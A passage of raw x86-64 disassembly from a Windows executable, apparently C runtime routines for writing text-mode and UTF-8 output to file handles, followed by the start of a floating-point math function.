   14000949b:	48 8b 05 76 bb 00 00 	mov    0xbb76(%rip),%rax        # 0x140015018
   1400094a2:	48 33 c4             	xor    %rsp,%rax
   1400094a5:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   1400094ac:	00 
   1400094ad:	48 8b f9             	mov    %rcx,%rdi
   1400094b0:	4c 63 d2             	movslq %edx,%r10
   1400094b3:	49 8b c2             	mov    %r10,%rax
   1400094b6:	41 8b e9             	mov    %r9d,%ebp
   1400094b9:	48 c1 f8 06          	sar    $0x6,%rax
   1400094bd:	48 8d 0d 4c d1 00 00 	lea    0xd14c(%rip),%rcx        # 0x140016610
   1400094c4:	41 83 e2 3f          	and    $0x3f,%r10d
   1400094c8:	49 03 e8             	add    %r8,%rbp
   1400094cb:	83 27 00             	andl   $0x0,(%rdi)
   1400094ce:	49 8b f0             	mov    %r8,%rsi
   1400094d1:	83 67 04 00          	andl   $0x0,0x4(%rdi)
   1400094d5:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   1400094d9:	83 67 08 00          	andl   $0x0,0x8(%rdi)
   1400094dd:	49 c1 e2 06          	shl    $0x6,%r10
   1400094e1:	4e 8b 74 10 28       	mov    0x28(%rax,%r10,1),%r14
   1400094e6:	4c 3b c5             	cmp    %rbp,%r8
   1400094e9:	0f 83 82 00 00 00    	jae    0x140009571
   1400094ef:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   1400094f4:	48 3b f5             	cmp    %rbp,%rsi
   1400094f7:	73 31                	jae    0x14000952a
   1400094f9:	0f b7 06             	movzwl (%rsi),%eax
   1400094fc:	48 83 c6 02          	add    $0x2,%rsi
   140009500:	66 83 f8 0a          	cmp    $0xa,%ax
   140009504:	75 10                	jne    0x140009516
   140009506:	83 47 08 02          	addl   $0x2,0x8(%rdi)
   14000950a:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000950f:	66 89 0b             	mov    %cx,(%rbx)
   140009512:	48 83 c3 02          	add    $0x2,%rbx
   140009516:	66 89 03             	mov    %ax,(%rbx)
   140009519:	48 83 c3 02          	add    $0x2,%rbx
   14000951d:	48 8d 84 24 3e 14 00 	lea    0x143e(%rsp),%rax
   140009524:	00 
   140009525:	48 3b d8             	cmp    %rax,%rbx
   140009528:	72 ca                	jb     0x1400094f4
   14000952a:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009530:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140009535:	48 2b d8             	sub    %rax,%rbx
   140009538:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000953d:	48 d1 fb             	sar    $1,%rbx
   140009540:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140009545:	03 db                	add    %ebx,%ebx
   140009547:	49 8b ce             	mov    %r14,%rcx
   14000954a:	44 8b c3             	mov    %ebx,%r8d
   14000954d:	ff 15 15 2c 00 00    	call   *0x2c15(%rip)        # 0x14000c168
   140009553:	85 c0                	test   %eax,%eax
   140009555:	74 12                	je     0x140009569
   140009557:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000955b:	01 47 04             	add    %eax,0x4(%rdi)
   14000955e:	3b c3                	cmp    %ebx,%eax
   140009560:	72 0f                	jb     0x140009571
   140009562:	48 3b f5             	cmp    %rbp,%rsi
   140009565:	72 88                	jb     0x1400094ef
   140009567:	eb 08                	jmp    0x140009571
   140009569:	ff 15 91 2a 00 00    	call   *0x2a91(%rip)        # 0x14000c000
   14000956f:	89 07                	mov    %eax,(%rdi)
   140009571:	48 8b c7             	mov    %rdi,%rax
   140009574:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000957b:	00 
   14000957c:	48 33 cc             	xor    %rsp,%rcx
   14000957f:	e8 1c 85 ff ff       	call   0x140001aa0
   140009584:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000958b:	00 
   14000958c:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140009590:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140009594:	49 8b e3             	mov    %r11,%rsp
   140009597:	41 5e                	pop    %r14
   140009599:	5f                   	pop    %rdi
   14000959a:	5e                   	pop    %rsi
   14000959b:	c3                   	ret
   14000959c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400095a1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400095a6:	56                   	push   %rsi
   1400095a7:	57                   	push   %rdi
   1400095a8:	41 54                	push   %r12
   1400095aa:	41 56                	push   %r14
   1400095ac:	41 57                	push   %r15
   1400095ae:	b8 70 14 00 00       	mov    $0x1470,%eax
   1400095b3:	e8 88 1e 00 00       	call   0x14000b440
   1400095b8:	48 2b e0             	sub    %rax,%rsp
   1400095bb:	48 8b 05 56 ba 00 00 	mov    0xba56(%rip),%rax        # 0x140015018
   1400095c2:	48 33 c4             	xor    %rsp,%rax
   1400095c5:	48 89 84 24 60 14 00 	mov    %rax,0x1460(%rsp)
   1400095cc:	00 
   1400095cd:	4c 63 d2             	movslq %edx,%r10
   1400095d0:	48 8b d9             	mov    %rcx,%rbx
   1400095d3:	49 8b c2             	mov    %r10,%rax
   1400095d6:	45 8b f1             	mov    %r9d,%r14d
   1400095d9:	48 c1 f8 06          	sar    $0x6,%rax
   1400095dd:	48 8d 0d 2c d0 00 00 	lea    0xd02c(%rip),%rcx        # 0x140016610
   1400095e4:	41 83 e2 3f          	and    $0x3f,%r10d
   1400095e8:	4d 03 f0             	add    %r8,%r14
   1400095eb:	49 c1 e2 06          	shl    $0x6,%r10
   1400095ef:	4d 8b f8             	mov    %r8,%r15
   1400095f2:	49 8b f8             	mov    %r8,%rdi
   1400095f5:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   1400095f9:	4e 8b 64 10 28       	mov    0x28(%rax,%r10,1),%r12
   1400095fe:	33 c0                	xor    %eax,%eax
   140009600:	83 23 00             	andl   $0x0,(%rbx)
   140009603:	48 89 43 04          	mov    %rax,0x4(%rbx)
   140009607:	4d 3b c6             	cmp    %r14,%r8
   14000960a:	0f 83 cf 00 00 00    	jae    0x1400096df
   140009610:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140009615:	49 3b fe             	cmp    %r14,%rdi
   140009618:	73 2d                	jae    0x140009647
   14000961a:	0f b7 0f             	movzwl (%rdi),%ecx
   14000961d:	48 83 c7 02          	add    $0x2,%rdi
   140009621:	66 83 f9 0a          	cmp    $0xa,%cx
   140009625:	75 0c                	jne    0x140009633
   140009627:	ba 0d 00 00 00       	mov    $0xd,%edx
   14000962c:	66 89 10             	mov    %dx,(%rax)
   14000962f:	48 83 c0 02          	add    $0x2,%rax
   140009633:	66 89 08             	mov    %cx,(%rax)
   140009636:	48 83 c0 02          	add    $0x2,%rax
   14000963a:	48 8d 8c 24 f8 06 00 	lea    0x6f8(%rsp),%rcx
   140009641:	00 
   140009642:	48 3b c1             	cmp    %rcx,%rax
   140009645:	72 ce                	jb     0x140009615
   140009647:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000964d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140009652:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140009658:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000965d:	48 2b c1             	sub    %rcx,%rax
   140009660:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   140009667:	00 
   140009668:	48 8d 8c 24 00 07 00 	lea    0x700(%rsp),%rcx
   14000966f:	00 
   140009670:	48 d1 f8             	sar    $1,%rax
   140009673:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140009678:	44 8b c8             	mov    %eax,%r9d
   14000967b:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   140009680:	33 d2                	xor    %edx,%edx
   140009682:	ff 15 f8 2a 00 00    	call   *0x2af8(%rip)        # 0x14000c180
   140009688:	8b e8                	mov    %eax,%ebp
   14000968a:	85 c0                	test   %eax,%eax
   14000968c:	74 49                	je     0x1400096d7
   14000968e:	33 f6                	xor    %esi,%esi
   140009690:	85 c0                	test   %eax,%eax
   140009692:	74 33                	je     0x1400096c7
   140009694:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000969a:	48 8d 94 24 00 07 00 	lea    0x700(%rsp),%rdx
   1400096a1:	00 
   1400096a2:	8b ce                	mov    %esi,%ecx
   1400096a4:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400096a9:	44 8b c5             	mov    %ebp,%r8d
   1400096ac:	48 03 d1             	add    %rcx,%rdx
   1400096af:	49 8b cc             	mov    %r12,%rcx
   1400096b2:	44 2b c6             	sub    %esi,%r8d
   1400096b5:	ff 15 ad 2a 00 00    	call   *0x2aad(%rip)        # 0x14000c168
   1400096bb:	85 c0                	test   %eax,%eax
   1400096bd:	74 18                	je     0x1400096d7
   1400096bf:	03 74 24 40          	add    0x40(%rsp),%esi
   1400096c3:	3b f5                	cmp    %ebp,%esi
   1400096c5:	72 cd                	jb     0x140009694
   1400096c7:	8b c7                	mov    %edi,%eax
   1400096c9:	41 2b c7             	sub    %r15d,%eax
   1400096cc:	89 43 04             	mov    %eax,0x4(%rbx)
   1400096cf:	49 3b fe             	cmp    %r14,%rdi
   1400096d2:	e9 33 ff ff ff       	jmp    0x14000960a
   1400096d7:	ff 15 23 29 00 00    	call   *0x2923(%rip)        # 0x14000c000
   1400096dd:	89 03                	mov    %eax,(%rbx)
   1400096df:	48 8b c3             	mov    %rbx,%rax
   1400096e2:	48 8b 8c 24 60 14 00 	mov    0x1460(%rsp),%rcx
   1400096e9:	00 
   1400096ea:	48 33 cc             	xor    %rsp,%rcx
   1400096ed:	e8 ae 83 ff ff       	call   0x140001aa0
   1400096f2:	4c 8d 9c 24 70 14 00 	lea    0x1470(%rsp),%r11
   1400096f9:	00 
   1400096fa:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400096fe:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   140009702:	49 8b e3             	mov    %r11,%rsp
   140009705:	41 5f                	pop    %r15
   140009707:	41 5e                	pop    %r14
   140009709:	41 5c                	pop    %r12
   14000970b:	5f                   	pop    %rdi
   14000970c:	5e                   	pop    %rsi
   14000970d:	c3                   	ret
   14000970e:	90                   	nop
   14000970f:	90                   	nop
   140009710:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140009715:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000971a:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000971e:	57                   	push   %rdi
   14000971f:	41 54                	push   %r12
   140009721:	41 55                	push   %r13
   140009723:	41 56                	push   %r14
   140009725:	41 57                	push   %r15
   140009727:	48 83 ec 20          	sub    $0x20,%rsp
   14000972b:	45 8b f8             	mov    %r8d,%r15d
   14000972e:	4c 8b e2             	mov    %rdx,%r12
   140009731:	48 63 d9             	movslq %ecx,%rbx
   140009734:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140009737:	75 18                	jne    0x140009751
   140009739:	e8 92 b5 ff ff       	call   0x140004cd0
   14000973e:	83 20 00             	andl   $0x0,(%rax)
   140009741:	e8 aa b5 ff ff       	call   0x140004cf0
   140009746:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000974c:	e9 90 00 00 00       	jmp    0x1400097e1
   140009751:	85 c9                	test   %ecx,%ecx
   140009753:	78 74                	js     0x1400097c9
   140009755:	3b 1d b5 d2 00 00    	cmp    0xd2b5(%rip),%ebx        # 0x140016a10
   14000975b:	73 6c                	jae    0x1400097c9
   14000975d:	48 8b f3             	mov    %rbx,%rsi
   140009760:	4c 8b f3             	mov    %rbx,%r14
   140009763:	49 c1 fe 06          	sar    $0x6,%r14
   140009767:	4c 8d 2d a2 ce 00 00 	lea    0xcea2(%rip),%r13        # 0x140016610
   14000976e:	83 e6 3f             	and    $0x3f,%esi
   140009771:	48 c1 e6 06          	shl    $0x6,%rsi
   140009775:	4b 8b 44 f5 00       	mov    0x0(%r13,%r14,8),%rax
   14000977a:	0f b6 4c 30 38       	movzbl 0x38(%rax,%rsi,1),%ecx
   14000977f:	83 e1 01             	and    $0x1,%ecx
   140009782:	74 45                	je     0x1400097c9
   140009784:	8b cb                	mov    %ebx,%ecx
   140009786:	e8 f5 d4 ff ff       	call   0x140006c80
   14000978b:	83 cf ff             	or     $0xffffffff,%edi
   14000978e:	4b 8b 44 f5 00       	mov    0x0(%r13,%r14,8),%rax
   140009793:	f6 44 30 38 01       	testb  $0x1,0x38(%rax,%rsi,1)
   140009798:	75 15                	jne    0x1400097af
   14000979a:	e8 51 b5 ff ff       	call   0x140004cf0
   14000979f:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400097a5:	e8 26 b5 ff ff       	call   0x140004cd0
   1400097aa:	83 20 00             	andl   $0x0,(%rax)
   1400097ad:	eb 0f                	jmp    0x1400097be
   1400097af:	45 8b c7             	mov    %r15d,%r8d
   1400097b2:	49 8b d4             	mov    %r12,%rdx
   1400097b5:	8b cb                	mov    %ebx,%ecx
   1400097b7:	e8 40 00 00 00       	call   0x1400097fc
   1400097bc:	8b f8                	mov    %eax,%edi
   1400097be:	8b cb                	mov    %ebx,%ecx
   1400097c0:	e8 df d4 ff ff       	call   0x140006ca4
   1400097c5:	8b c7                	mov    %edi,%eax
   1400097c7:	eb 1b                	jmp    0x1400097e4
   1400097c9:	e8 02 b5 ff ff       	call   0x140004cd0
   1400097ce:	83 20 00             	andl   $0x0,(%rax)
   1400097d1:	e8 1a b5 ff ff       	call   0x140004cf0
   1400097d6:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400097dc:	e8 ef b3 ff ff       	call   0x140004bd0
   1400097e1:	83 c8 ff             	or     $0xffffffff,%eax
   1400097e4:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400097e9:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400097ee:	48 83 c4 20          	add    $0x20,%rsp
   1400097f2:	41 5f                	pop    %r15
   1400097f4:	41 5e                	pop    %r14
   1400097f6:	41 5d                	pop    %r13
   1400097f8:	41 5c                	pop    %r12
   1400097fa:	5f                   	pop    %rdi
   1400097fb:	c3                   	ret
   1400097fc:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009801:	55                   	push   %rbp
   140009802:	56                   	push   %rsi
   140009803:	57                   	push   %rdi
   140009804:	41 54                	push   %r12
   140009806:	41 55                	push   %r13
   140009808:	41 56                	push   %r14
   14000980a:	41 57                	push   %r15
   14000980c:	48 8b ec             	mov    %rsp,%rbp
   14000980f:	48 83 ec 60          	sub    $0x60,%rsp
   140009813:	33 ff                	xor    %edi,%edi
   140009815:	45 8b f8             	mov    %r8d,%r15d
   140009818:	4c 63 e1             	movslq %ecx,%r12
   14000981b:	48 8b f2             	mov    %rdx,%rsi
   14000981e:	45 85 c0             	test   %r8d,%r8d
   140009821:	75 07                	jne    0x14000982a
   140009823:	33 c0                	xor    %eax,%eax
   140009825:	e9 9b 02 00 00       	jmp    0x140009ac5
   14000982a:	48 85 d2             	test   %rdx,%rdx
   14000982d:	75 1f                	jne    0x14000984e
   14000982f:	e8 9c b4 ff ff       	call   0x140004cd0
   140009834:	89 38                	mov    %edi,(%rax)
   140009836:	e8 b5 b4 ff ff       	call   0x140004cf0
   14000983b:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140009841:	e8 8a b3 ff ff       	call   0x140004bd0
   140009846:	83 c8 ff             	or     $0xffffffff,%eax
   140009849:	e9 77 02 00 00       	jmp    0x140009ac5
   14000984e:	4d 8b f4             	mov    %r12,%r14
   140009851:	48 8d 05 b8 cd 00 00 	lea    0xcdb8(%rip),%rax        # 0x140016610
   140009858:	41 83 e6 3f          	and    $0x3f,%r14d
   14000985c:	4d 8b ec             	mov    %r12,%r13
   14000985f:	49 c1 fd 06          	sar    $0x6,%r13
   140009863:	49 c1 e6 06          	shl    $0x6,%r14
   140009867:	4c 89 6d f0          	mov    %r13,-0x10(%rbp)
   14000986b:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   14000986f:	42 8a 5c 31 39       	mov    0x39(%rcx,%r14,1),%bl
   140009874:	8d 43 ff             	lea    -0x1(%rbx),%eax
   140009877:	3c 01                	cmp    $0x1,%al
   140009879:	77 09                	ja     0x140009884
   14000987b:	41 8b c7             	mov    %r15d,%eax
   14000987e:	f7 d0                	not    %eax
   140009880:	a8 01                	test   $0x1,%al
   140009882:	74 ab                	je     0x14000982f
   140009884:	42 f6 44 31 38 20    	testb  $0x20,0x38(%rcx,%r14,1)
   14000988a:	74 0e                	je     0x14000989a
   14000988c:	33 d2                	xor    %edx,%edx
   14000988e:	41 8b cc             	mov    %r12d,%ecx
   140009891:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   140009895:	e8 4e 08 00 00       	call   0x14000a0e8
   14000989a:	41 8b cc             	mov    %r12d,%ecx
   14000989d:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   1400098a1:	e8 4a f4 ff ff       	call   0x140008cf0
   1400098a6:	85 c0                	test   %eax,%eax
   1400098a8:	0f 84 01 01 00 00    	je     0x1400099af
   1400098ae:	48 8d 05 5b cd 00 00 	lea    0xcd5b(%rip),%rax        # 0x140016610
   1400098b5:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   1400098b9:	42 f6 44 30 38 80    	testb  $0x80,0x38(%rax,%r14,1)
   1400098bf:	0f 84 ea 00 00 00    	je     0x1400099af
   1400098c5:	e8 e6 b7 ff ff       	call   0x1400050b0
   1400098ca:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   1400098d1:	48 39 b9 38 01 00 00 	cmp    %rdi,0x138(%rcx)
   1400098d8:	75 16                	jne    0x1400098f0
   1400098da:	48 8d 05 2f cd 00 00 	lea    0xcd2f(%rip),%rax        # 0x140016610
   1400098e1:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   1400098e5:	42 38 7c 30 39       	cmp    %dil,0x39(%rax,%r14,1)
   1400098ea:	0f 84 bf 00 00 00    	je     0x1400099af
   1400098f0:	48 8d 05 19 cd 00 00 	lea    0xcd19(%rip),%rax        # 0x140016610
   1400098f7:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   1400098fb:	48 8d 55 f8          	lea    -0x8(%rbp),%rdx
   1400098ff:	4a 8b 4c 31 28       	mov    0x28(%rcx,%r14,1),%rcx
   140009904:	ff 15 36 29 00 00    	call   *0x2936(%rip)        # 0x14000c240
   14000990a:	85 c0                	test   %eax,%eax
   14000990c:	0f 84 9d 00 00 00    	je     0x1400099af
   140009912:	84 db                	test   %bl,%bl
   140009914:	74 7b                	je     0x140009991
   140009916:	fe cb                	dec    %bl
   140009918:	80 fb 01             	cmp    $0x1,%bl
   14000991b:	0f 87 2b 01 00 00    	ja     0x140009a4c
   140009921:	21 7d d0             	and    %edi,-0x30(%rbp)
   140009924:	4e 8d 24 3e          	lea    (%rsi,%r15,1),%r12
   140009928:	33 db                	xor    %ebx,%ebx
   14000992a:	4c 8b fe             	mov    %rsi,%r15
   14000992d:	89 5d d4             	mov    %ebx,-0x2c(%rbp)
   140009930:	49 3b f4             	cmp    %r12,%rsi
   140009933:	0f 83 09 01 00 00    	jae    0x140009a42
   140009939:	45 0f b7 2f          	movzwl (%r15),%r13d
   14000993d:	41 0f b7 cd          	movzwl %r13w,%ecx
   140009941:	e8 9a 08 00 00       	call   0x14000a1e0
   140009946:	66 41 3b c5          	cmp    %r13w,%ax
   14000994a:	75 33                	jne    0x14000997f
   14000994c:	83 c3 02             	add    $0x2,%ebx
   14000994f:	89 5d d4             	mov    %ebx,-0x2c(%rbp)
   140009952:	66 41 83 fd 0a       	cmp    $0xa,%r13w
   140009957:	75 1b                	jne    0x140009974
   140009959:	41 bd 0d 00 00 00    	mov    $0xd,%r13d
   14000995f:	41 8b cd             	mov    %r13d,%ecx
   140009962:	e8 79 08 00 00       	call   0x14000a1e0
   140009967:	66 41 3b c5          	cmp    %r13w,%ax
   14000996b:	75 12                	jne    0x14000997f
   14000996d:	ff c3                	inc    %ebx
   14000996f:	89 5d d4             	mov    %ebx,-0x2c(%rbp)
   140009972:	ff c7                	inc    %edi
   140009974:	49 83 c7 02          	add    $0x2,%r15
   140009978:	4d 3b fc             	cmp    %r12,%r15
   14000997b:	73 0b                	jae    0x140009988
   14000997d:	eb ba                	jmp    0x140009939
   14000997f:	ff 15 7b 26 00 00    	call   *0x267b(%rip)        # 0x14000c000
   140009985:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140009988:	4c 8b 6d f0          	mov    -0x10(%rbp),%r13
   14000998c:	e9 b1 00 00 00       	jmp    0x140009a42
   140009991:	45 8b cf             	mov    %r15d,%r9d
   140009994:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140009998:	4c 8b c6             	mov    %rsi,%r8
   14000999b:	41 8b d4             	mov    %r12d,%edx
   14000999e:	e8 cd f7 ff ff       	call   0x140009170
   1400099a3:	f2 0f 10 00          	movsd  (%rax),%xmm0
   1400099a7:	8b 78 08             	mov    0x8(%rax),%edi
   1400099aa:	e9 98 00 00 00       	jmp    0x140009a47
   1400099af:	48 8d 05 5a cc 00 00 	lea    0xcc5a(%rip),%rax        # 0x140016610
   1400099b6:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   1400099ba:	42 f6 44 31 38 80    	testb  $0x80,0x38(%rcx,%r14,1)
   1400099c0:	74 4d                	je     0x140009a0f
   1400099c2:	0f be cb             	movsbl %bl,%ecx
   1400099c5:	84 db                	test   %bl,%bl
   1400099c7:	74 32                	je     0x1400099fb
   1400099c9:	83 e9 01             	sub    $0x1,%ecx
   1400099cc:	74 19                	je     0x1400099e7
   1400099ce:	83 f9 01             	cmp    $0x1,%ecx
   1400099d1:	75 79                	jne    0x140009a4c
   1400099d3:	45 8b cf             	mov    %r15d,%r9d
   1400099d6:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   1400099da:	4c 8b c6             	mov    %rsi,%r8
   1400099dd:	41 8b d4             	mov    %r12d,%edx
   1400099e0:	e8 9b fa ff ff       	call   0x140009480
   1400099e5:	eb bc                	jmp    0x1400099a3
   1400099e7:	45 8b cf             	mov    %r15d,%r9d
   1400099ea:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   1400099ee:	4c 8b c6             	mov    %rsi,%r8
   1400099f1:	41 8b d4             	mov    %r12d,%edx
   1400099f4:	e8 a3 fb ff ff       	call   0x14000959c
   1400099f9:	eb a8                	jmp    0x1400099a3
   1400099fb:	45 8b cf             	mov    %r15d,%r9d
   1400099fe:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140009a02:	4c 8b c6             	mov    %rsi,%r8
   140009a05:	41 8b d4             	mov    %r12d,%edx
   140009a08:	e8 6b f9 ff ff       	call   0x140009378
   140009a0d:	eb 94                	jmp    0x1400099a3
   140009a0f:	4a 8b 4c 31 28       	mov    0x28(%rcx,%r14,1),%rcx
   140009a14:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   140009a18:	21 7d d0             	and    %edi,-0x30(%rbp)
   140009a1b:	33 c0                	xor    %eax,%eax
   140009a1d:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   140009a22:	45 8b c7             	mov    %r15d,%r8d
   140009a25:	48 8b d6             	mov    %rsi,%rdx
   140009a28:	48 89 45 d4          	mov    %rax,-0x2c(%rbp)
   140009a2c:	ff 15 36 27 00 00    	call   *0x2736(%rip)        # 0x14000c168
   140009a32:	85 c0                	test   %eax,%eax
   140009a34:	75 09                	jne    0x140009a3f
   140009a36:	ff 15 c4 25 00 00    	call   *0x25c4(%rip)        # 0x14000c000
   140009a3c:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140009a3f:	8b 7d d8             	mov    -0x28(%rbp),%edi
   140009a42:	f2 0f 10 45 d0       	movsd  -0x30(%rbp),%xmm0
   140009a47:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   140009a4c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140009a50:	48 c1 e8 20          	shr    $0x20,%rax
   140009a54:	85 c0                	test   %eax,%eax
   140009a56:	75 68                	jne    0x140009ac0
   140009a58:	8b 45 e0             	mov    -0x20(%rbp),%eax
   140009a5b:	85 c0                	test   %eax,%eax
   140009a5d:	74 2d                	je     0x140009a8c
   140009a5f:	83 f8 05             	cmp    $0x5,%eax
   140009a62:	75 1b                	jne    0x140009a7f
   140009a64:	e8 87 b2 ff ff       	call   0x140004cf0
   140009a69:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009a6f:	e8 5c b2 ff ff       	call   0x140004cd0
   140009a74:	c7 00 05 00 00 00    	movl   $0x5,(%rax)
   140009a7a:	e9 c7 fd ff ff       	jmp    0x140009846
   140009a7f:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   140009a82:	e8 f9 b1 ff ff       	call   0x140004c80
   140009a87:	e9 ba fd ff ff       	jmp    0x140009846
   140009a8c:	48 8d 05 7d cb 00 00 	lea    0xcb7d(%rip),%rax        # 0x140016610
   140009a93:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   140009a97:	42 f6 44 30 38 40    	testb  $0x40,0x38(%rax,%r14,1)
   140009a9d:	74 09                	je     0x140009aa8
   140009a9f:	80 3e 1a             	cmpb   $0x1a,(%rsi)
   140009aa2:	0f 84 7b fd ff ff    	je     0x140009823
   140009aa8:	e8 43 b2 ff ff       	call   0x140004cf0
   140009aad:	c7 00 1c 00 00 00    	movl   $0x1c,(%rax)
   140009ab3:	e8 18 b2 ff ff       	call   0x140004cd0
   140009ab8:	83 20 00             	andl   $0x0,(%rax)
   140009abb:	e9 86 fd ff ff       	jmp    0x140009846
   140009ac0:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140009ac3:	2b c7                	sub    %edi,%eax
   140009ac5:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   140009acc:	00 
   140009acd:	48 83 c4 60          	add    $0x60,%rsp
   140009ad1:	41 5f                	pop    %r15
   140009ad3:	41 5e                	pop    %r14
   140009ad5:	41 5d                	pop    %r13
   140009ad7:	41 5c                	pop    %r12
   140009ad9:	5f                   	pop    %rdi
   140009ada:	5e                   	pop    %rsi
   140009adb:	5d                   	pop    %rbp
   140009adc:	c3                   	ret
   140009add:	90                   	nop
   140009ade:	90                   	nop
   140009adf:	90                   	nop
   140009ae0:	48 83 ec 58          	sub    $0x58,%rsp
   140009ae4:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   140009aea:	83 3d 83 cf 00 00 00 	cmpl   $0x0,0xcf83(%rip)        # 0x140016a74
   140009af1:	0f 85 c2 02 00 00    	jne    0x140009db9
   140009af7:	66 0f 28 d8          	movapd %xmm0,%xmm3
   140009afb:	66 0f 28 e0          	movapd %xmm0,%xmm4
   140009aff:	66 0f 73 d3 34       	psrlq  $0x34,%xmm3
   140009b04:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140009b09:	66 0f fb 1d af 73 00 	psubq  0x73af(%rip),%xmm3        # 0x140010ec0
   140009b10:	00 
   140009b11:	66 0f 28 e8          	movapd %xmm0,%xmm5
   140009b15:	66 0f 54 2d 73 73 00 	andpd  0x7373(%rip),%xmm5        # 0x140010e90
   140009b1c:	00 
   140009b1d:	66 0f 2f 2d 6b 73 00 	comisd 0x736b(%rip),%xmm5        # 0x140010e90
   140009b24:	00 
   140009b25:	0f 84 63 02 00 00    	je     0x140009d8e
   140009b2b:	66 0f 28 d0          	movapd %xmm0,%xmm2
   140009b2f:	f3 0f e6 f3          	cvtdq2pd %xmm3,%xmm6
   140009b33:	66 0f 57 ed          	xorpd  %xmm5,%xmm5
   140009b37:	66 0f 2f c5          	comisd %xmm5,%xmm0
   140009b3b:	0f 86 1f 02 00 00    	jbe    0x140009d60
   140009b41:	66 0f db 15 87 73 00 	pand   0x7387(%rip),%xmm2        # 0x140010ed0
   140009b48:	00 
   140009b49:	f2 0f 5c 25 0f 74 00 	subsd  0x740f(%rip),%xmm4        # 0x140010f60
   140009b50:	00 
   140009b51:	66 0f 2f 35 77 74 00 	comisd 0x7477(%rip),%xmm6        # 0x140010fd0
   140009b58:	00 
   140009b59:	0f 84 ca 01 00 00    	je     0x140009d29
   140009b5f:	66 0f 54 25 99 74 00 	andpd  0x7499(%rip),%xmm4        # 0x140011000
   140009b66:	00 
   140009b67:	4c 8b c8             	mov    %rax,%r9
   140009b6a:	48 23 05 6f 73 00 00 	and    0x736f(%rip),%rax        # 0x140010ee0
   140009b71:	4c 23 0d 78 73 00 00 	and    0x7378(%rip),%r9        # 0x140010ef0
   140009b78:	49 d1 e1             	shl    $1,%r9
   140009b7b:	49 03 c1             	add    %r9,%rax
   140009b7e:	66 48 0f 6e c8       	movq   %rax,%xmm1
   140009b83:	66 0f 2f 25 65 74 00 	comisd 0x7465(%rip),%xmm4        # 0x140010ff0
   140009b8a:	00 
   140009b8b:	0f 82 d1 00 00 00    	jb     0x140009c62
   140009b91:	48 c1 e8 2c          	shr    $0x2c,%rax
   140009b95:	66 0f eb 15 d3 73 00 	por    0x73d3(%rip),%xmm2        # 0x140010f70
   140009b9c:	00 
   140009b9d:	66 0f eb 0d cb 73 00 	por    0x73cb(%rip),%xmm1        # 0x140010f70
   140009ba4:	00 
   140009ba5:	4c 8d 0d e4 84 00 00 	lea    0x84e4(%rip),%r9        # 0x140012090
   140009bac:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   140009bb0:	f2 41 0f 59 0c c1    	mulsd  (%r9,%rax,8),%xmm1
   140009bb6:	66 0f 28 d1          	movapd %xmm1,%xmm2
